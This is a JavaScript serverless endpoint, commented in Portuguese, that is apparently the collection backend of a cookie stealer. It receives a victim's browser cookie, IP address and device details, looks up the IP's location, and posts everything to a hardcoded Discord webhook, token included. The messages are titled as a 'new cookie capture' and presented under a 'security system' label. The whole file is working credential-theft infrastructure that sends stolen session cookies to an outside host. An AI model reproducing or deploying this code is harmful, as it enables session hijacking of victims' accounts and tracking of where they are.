export default async function handler(req, res) {
  // CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { cookie, ip, device } = req.body;

    // Validar dados
    if (!cookie || cookie.length < 50) {
      return res.status(400).json({ error: 'Cookie inválido' });
    }

    // Buscar informações do IP (com timeout)
    let ipInfo = {};
    try {
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 5000);
      const ipResponse = await fetch(`http://ip-api.com/json/${ip}?fields=66846719`, {
        signal: controller.signal
      });
      clearTimeout(timeoutId);
      if (ipResponse.ok) {
        ipInfo = await ipResponse.json();
      }
    } catch (e) {
      console.error('Erro ao buscar info do IP:', e.message);
    }

    // WEBHOOK DO DISCORD
    const webhookURL = 'https://canary.discord.com/api/webhooks/1477057706568323195/4545g7HNyqcjMCkJe2t95-djEoA-kuXgu-VY1u_zb6slpT3lpdmbwyxDl8urWU51Effi';

    // ===== FUNÇÃO PARA DIVIDIR COOKIE GRANDE EM PARTES =====
    const MAX_FIELD_SIZE = 1900; // Discord tem limite de 2000, deixamos margem
    
    function splitCookie(cookieStr) {
      if (cookieStr.length <= MAX_FIELD_SIZE) {
        return [cookieStr];
      }
      
      const parts = [];
      let remaining = cookieStr;
      
      while (remaining.length > MAX_FIELD_SIZE) {
        let splitIndex = remaining.lastIndexOf(':', MAX_FIELD_SIZE);
        if (splitIndex === -1) splitIndex = remaining.lastIndexOf('-', MAX_FIELD_SIZE);
        if (splitIndex === -1) splitIndex = remaining.lastIndexOf('=', MAX_FIELD_SIZE);
        if (splitIndex === -1) splitIndex = MAX_FIELD_SIZE;
        
        parts.push(remaining.substring(0, splitIndex));
        remaining = remaining.substring(splitIndex);
      }
      parts.push(remaining);
      
      return parts;
    }

    const cookieParts = splitCookie(cookie);
    
    // ===== CONSTRUIR FIELDS =====
    const fields = [];
    
    // Adicionar partes do cookie
    if (cookieParts.length === 1) {
      fields.push({
        name: '🍪 COOKIE COMPLETO',
        value: '```' + cookieParts[0] + '```'
      });
    } else {
      fields.push({
        name: '⚠️ COOKIE GRANDE - PARTE 1/' + cookieParts.length,
        value: '```' + cookieParts[0] + '```'
      });
      for (let i = 1; i < cookieParts.length; i++) {
        fields.push({
          name: `📦 PARTE ${i+1}/${cookieParts.length}`,
          value: '```' + cookieParts[i] + '```'
        });
      }
    }
    
    // Informações do dispositivo COMPLETAS
    const userAgent = req.headers['user-agent'] || 'Desconhecido';
    const acceptLanguage = req.headers['accept-language'] || 'Desconhecido';
    
    fields.push({
      name: '📊 INFORMAÇÕES DO DISPOSITIVO',
      value: `\`\`\`yml
Dispositivo: ${device || 'Desconhecido'}
Navegador: ${getBrowserInfo(userAgent)}
Sistema: ${getOSInfo(userAgent)}
Idioma: ${acceptLanguage}
User-Agent: ${userAgent.substring(0, 150)}${userAgent.length > 150 ? '...' : ''}
\`\`\``
    });
    
    // Informações do IP COMPLETAS
    fields.push({
      name: '🌍 INFORMAÇÕES DO IP',
      value: `\`\`\`yml
IP: ${ip || 'Desconhecido'}
País: ${ipInfo.country || 'Desconhecido'} ${ipInfo.countryCode || ''}
Região: ${ipInfo.regionName || 'Desconhecido'}
Cidade: ${ipInfo.city || 'Desconhecido'}
CEP: ${ipInfo.zip || 'Desconhecido'}
Latitude: ${ipInfo.lat || 'Desconhecido'}
Longitude: ${ipInfo.lon || 'Desconhecido'}
Fuso Horário: ${ipInfo.timezone || 'Desconhecido'}
Provedor: ${ipInfo.isp || 'Desconhecido'}
Organização: ${ipInfo.org || 'Desconhecido'}
Mobile: ${ipInfo.mobile ? 'Sim' : 'Não'}
Proxy/VPN: ${ipInfo.proxy ? 'Sim' : 'Não'}
Hosting: ${ipInfo.hosting ? 'Sim' : 'Não'}
\`\`\``
    });
    
    // Informações adicionais
    fields.push({
      name: '⏰ TIMESTAMP',
      value: `<t:${Math.floor(Date.now() / 1000)}:F> (<t:${Math.floor(Date.now() / 1000)}:R>)`,
      inline: true
    });
    
    fields.push({
      name: '🔢 ID DA SESSÃO',
      value: `\`${generateSessionId()}\``,
      inline: true
    });
    
    fields.push({
      name: '📏 TAMANHO DO COOKIE',
      value: `\`${cookie.length} caracteres (${cookieParts.length} parte(s))\``,
      inline: true
    });

    // ===== CRIAR EMBEDS =====
    // O Discord permite no máximo 10 campos por embed
    // Se tivermos muitos campos, criamos múltiplos embeds
    const embeds = [];
    const MAX_FIELDS_PER_EMBED = 10;
    
    for (let i = 0; i < fields.length; i += MAX_FIELDS_PER_EMBED) {
      const embedFields = fields.slice(i, i + MAX_FIELDS_PER_EMBED);
      
      embeds.push({
        title: i === 0 ? '🔐 NOVA CAPTURA DE COOKIE' : `📎 CONTINUAÇÃO (${Math.floor(i/MAX_FIELDS_PER_EMBED) + 1})`,
        description: i === 0 ? 'Um novo cookie foi capturado pelo sistema Aurora' : 'Continuação das informações',
        color: 0x6366f1,
        fields: embedFields,
        footer: {
          text: `Aurora Security System • Proteção Avançada ${cookieParts.length > 1 ? `• Cookie dividido em ${cookieParts.length} partes` : ''}`,
          icon_url: 'https://media.discordapp.net/attachments/1478076459074719877/1478567053999869993/Gemini_Generated_Image_17qz9117qz9117qz.png'
        },
        timestamp: new Date().toISOString(),
        thumbnail: {
          url: 'https://media.discordapp.net/attachments/1456825082507956428/1477117859665805312/clideo_editor_64f89f8646e04ff7b36cd451bf005602_online-video-cutter.com.gif'
        }
      });
    }

    // ===== ENVIAR PARA O DISCORD =====
    let allSuccess = true;
    
    for (let i = 0; i < embeds.length; i++) {
      const payload = {
        content: i === 0 ? '@everyone' : null,
        embeds: [embeds[i]]
      };
      
      const response = await fetch(webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
      
      if (!response.ok) {
        allSuccess = false;
        console.error(`Erro ao enviar embed ${i + 1}:`, await response.text());
      }
      
      // Pequeno delay entre embeds para não sobrecarregar
      if (embeds.length > 1 && i < embeds.length - 1) {
        await new Promise(resolve => setTimeout(resolve, 500));
      }
    }

    if (!allSuccess) {
      return res.status(500).json({ error: 'Falha ao enviar algumas partes para o Discord' });
    }

    return res.status(200).json({ 
      success: true, 
      message: `Cookie enviado com sucesso! (${cookieParts.length} parte(s))` 
    });

  } catch (error) {
    console.error('Erro interno:', error);
    return res.status(500).json({ error: 'Erro interno do servidor: ' + error.message });
  }
}

// ===== FUNÇÕES AUXILIARES =====

function getBrowserInfo(ua) {
  if (!ua) return 'Desconhecido';
  ua = ua.toLowerCase();
  if (ua.includes('chrome') && !ua.includes('edg')) return 'Google Chrome';
  if (ua.includes('firefox')) return 'Mozilla Firefox';
  if (ua.includes('safari') && !ua.includes('chrome')) return 'Apple Safari';
  if (ua.includes('edg')) return 'Microsoft Edge';
  if (ua.includes('opera') || ua.includes('opr')) return 'Opera';
  if (ua.includes('brave')) return 'Brave';
  return 'Desconhecido';
}

function getOSInfo(ua) {
  if (!ua) return 'Desconhecido';
  ua = ua.toLowerCase();
  if (ua.includes('windows')) return 'Windows';
  if (ua.includes('mac os') || ua.includes('macintosh')) return 'macOS';
  if (ua.includes('linux')) return 'Linux';
  if (ua.includes('android')) return 'Android';
  if (ua.includes('ios') || ua.includes('iphone') || ua.includes('ipad')) return 'iOS';
  return 'Desconhecido';
}

function generateSessionId() {
  return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
}
